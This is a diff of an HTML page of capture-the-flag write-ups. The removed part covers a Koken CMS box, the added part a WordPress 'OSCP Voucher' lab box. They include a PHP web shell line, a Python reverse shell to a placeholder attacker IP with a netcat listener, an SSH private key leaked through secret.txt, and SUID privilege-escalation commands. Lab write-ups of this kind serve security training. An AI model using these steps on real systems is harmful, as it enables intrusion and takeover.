@@ -124,86 +124,83 @@ pre {
 		</header> 
 		
 		<div class="gallery">
-		  <p>
-		   <div class="desc">Port Scan</div>
-		    <img src="source/1.PNG" style="width:500px; height: 500px;"> 
-		   </p>
 		   <p>
-		    <div class="desc">Samba</div>
-			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient -L $IP
-smbclient //$IP/sambashare
-get mailsent.txt
-get wordpress.bkp.zip</code></pre></div></div>
-			<br>
-		    <img src="source/2.PNG" style="width:520px; height: 350px;"> 
+		    <div class="desc">Port Scan</div>
+			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[stukas@parrot]─[~]
+└──╼ $nmap -A -O -sS 10.0.2.5
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-generator: WordPress 5.4.2
+| http-robots.txt: 1 disallowed entry 
+|_/secret.txt
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: OSCP Voucher &#8211; Just another WordPress site</code></pre></div></div>
 		   </p>
 		  <p>
-		    <div class="desc">Read the mailsent.txt</div><br>
-			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username : daisa
-password : babygirl</code></pre></div></div>
-		    <img src="source/3.PNG" style="width:600px; height: 360px;"> 
+		    <div class="desc">Read the robots.txt & secret.txt</div><br>
+		 <img src="source/1.PNG" style="width:600px; height: 360px;"><br>
+		 <img src="source/2.PNG" style="width:600px; height: 360px;"> <br>
+			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[stukas@parrot]─[~]
+└──╼ $curl http://10.0.2.5/robots.txt
+User-Agent: *
+Disallow: /secret.txt
+
+┌─[stukas@parrot]─[~]
+└──╼ $curl http://10.0.2.5/secret.txt > base64Encoded
+
+
+┌─[stukas@parrot]─[~]
+└──╼ $cat base64Encoded
+LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFB
+QUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFB
+....
+bWNYQnJmSXd4Y1ZUCjhuZksyb0RjNkxmckRtalFBQUFBbHZjMk53UUc5elkzQT0KLS0tLS1FTkQg
+T1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==
+
+┌─[stukas@parrot]─[~]
+└──╼ $base64 -d base64Encoded > id_rsa
+
+┌─[stukas@parrot]─[~]
+└──╼ $cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAtHCsSzHtUF8K8tiOqECQYLrKKrCRsbvq6iIG7R9g0WPv9w+gkUWe
+....
+kuoRiShh6uCjGCCH/WfwCof9enCej4HEj5EPj8nZ0cMNvoARq7VnCNGTPamcXBrfIwxcVT
+8nfK2oDc6LfrDmjQAAAAlvc2NwQG9zY3A=
+-----END OPENSSH PRIVATE KEY-----</code></pre></div></div>
+		<div class="desc">The secret.txt was base64 encoded private key </div><br>
+		<div class="desc">We decoded it, Now we have to find the username</div><br>
 		   </p>
 		    <p>
-		    <div class="desc">Directory scan</div>
-			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dirb http://$TARGET:8000 -f</code></pre></div></div>
-		    <img src="source/5.PNG" style="width:500px; height: 50px;"><br><br>
-			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Found /admin/</code></pre></div></div>
-		    <img src="source/51.PNG" style="width:600px; height: 100px;"><br>
+		    <div class="desc">Found the oscp username | SSH Login</div>
+		<img src="source/3.PNG" style="width:500px; height: 50px;"><br><br>
+			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chmod 700 id_rsa
+ssh -i id_rsa oscp@10.0.2.5</code></pre></div></div>
+		    <img src="source/4.PNG" style="width:600px; height: 100px;"><br>
 		   </p>
 		 <p>
-		    <div class="desc">Login </div>
-			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>email : daisa@photographer.com
-password : babygirl</code></pre></div></div><br>
-		    <img src="source/6.PNG" style="width:830px; height:454px;"><br>
+		    <div class="desc">Find SUID permissions</div>
+			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-5.0$ find / -perm -u=s -type f 2>/dev/null
+....
+/usr/bin/bash
+....</code></pre></div></div><br>
+		    <img src="source/5.PNG" style="width:830px; height:454px;"><br>
 		  </p>
 		  <p>
-		    <div class="desc">Search for Koken 0.22.24 vulnerability</div>
-		    <img src="source/7.PNG" style="width:450px; height: 320px;"><br><br>
-		    <div class="desc">Found : Koken CMS 0.22.24 Shell Upload</div>
-		    <img src="source/8.PNG" style="width:600px; height: 500px;"><br><br>
-		    <div class="desc">Create malicious jpg file</div>
-			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>system($_GET['cmd']);</code></pre></div></div>
-		    <img src="source/9.PNG" style="width:400px; height: 200px;"><br><br>
-		    <div class="desc">Upload the image.php.jpg</div>
-		    <img src="source/10.PNG" style="width:600px; height: 450px;"><br><br>
-			<div class="desc">Use Burpsuite to change the image.php.jpg => image.php</div>
-		    <img src="source/11.PNG" style="width:600px; height: 600px;"><br><br>
-			<div class="desc">Move the cursor on the "Download File" to see the original path of the image.php</div>
-		    <img src="source/12.PNG" style="width:600px; height: 450px;">
-			<br><br>
-			</p>
-			<p>
-		    <div class="desc">Reverse shell | We are able to execute commands.</div>
-		    <img src="source/13.PNG" style="width:800px; height: 320px;"><br><br>
-		    <div class="desc">Python reverse shell</div>
-			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><div class="desc">|Target machine|</div>image.php?cmd= python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-s.connect(("YOUR IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
-os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-            <div class="desc">|Your machine|</div>nc -lvp 4444</code></pre></div></div>
-			<br>
-		    <img src="source/14.PNG" style="width:800px; height: 400px;"><br><br>
-		    <div class="desc">Found the user.txt</div>
-			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight">cd /home/daisa/
-cat user.txt</code></pre></div></div><br>
-		    <img src="source/15.PNG" style="width:600px; height: 300px;"><br><br>
-			</p>
-			<p>
-		    <div class="desc">Root Privilege Escalation</div>
-			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -perm -u=s -type f 2>/dev/null</code></pre></div></div>
-			<div class="desc">I found the suspicious /usr/bin/php7.2</div>
-		    <img src="source/16.PNG" style="width:400px; height: 360px;"> <br><br>
-			<div class="desc">Let's search for GTFOBins php</div>
-			<img src="source/161.PNG" style="width:600px; height: 300px;"><br><br>
-			<div class="desc">We found the SUID exploit, i will use the full path for php7.2</div>
-			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight">
-CMD="/bin/sh"
-/usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"</code></pre></div></div><br>
-		    <img src="source/17.PNG" style="width:600px; height: 600px;"> 
-			<br><br>
-			<h2>Rooted</h2>
-		   </p>
+		    <div class="desc">GTFOBins | bash</div>
+		    <img src="source/6.PNG" style="width:450px; height: 320px;"><br><br>
+		    <div class="desc">Privesc to Root</div>
+			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-5.0$ sh -c 'cp $(which bash) .; chmod +s ./bash'
+bash-5.0$ /usr/bin/bash -p
+bash-5.0# bash -p
+bash-5.0# whoami
+root</code></pre></div></div>
+		    <img src="source/7.PNG" style="width:400px; height: 200px;"><br><br>
+		    <div class="desc">Rooted :)</div>
+			</p>	
 		</div> 
-		
 		<footer>
 			<div class="social">
 				<a  href="https://github.com/alienaki">
